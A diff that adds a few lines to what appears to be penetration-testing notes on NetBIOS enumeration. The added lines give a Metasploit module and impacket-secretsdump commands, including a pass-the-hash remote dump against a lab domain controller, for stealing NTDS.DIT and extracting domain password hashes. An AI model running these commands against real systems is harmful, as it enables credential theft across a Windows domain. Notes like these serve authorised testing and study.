@@ -107,6 +107,14 @@ it would have signified it was an IIS server.
 Note the differences between the U and the G. U = UNIQUE and G = GROUP. When you see a hex code next 
 to UNIQUE it is usually associated with the computer itself. With GROUP it is associated with the 
 workgroup or domain.
+
+- Use the following MSF module to authenticate to the DC via SMB, create a volume shadow copy of the
+system drive, and downloads copies of NTDS.DIT and SYSTEM hive. Then use Impacket to perform 
+extraction of the hashes.
+auxiliary/admin/smb/psexec_ntdsgrab
+impacket-secretsdump -system SYSTEM -ntds NTDS.DIT LOCAL
+
+impacket-secretsdump -hashes <hash> -just-dc LAB/dc\$@10.0.0.1    # Remote dump
 ------------------------------------------------------------------------------------------------------
 
 # Enumeration
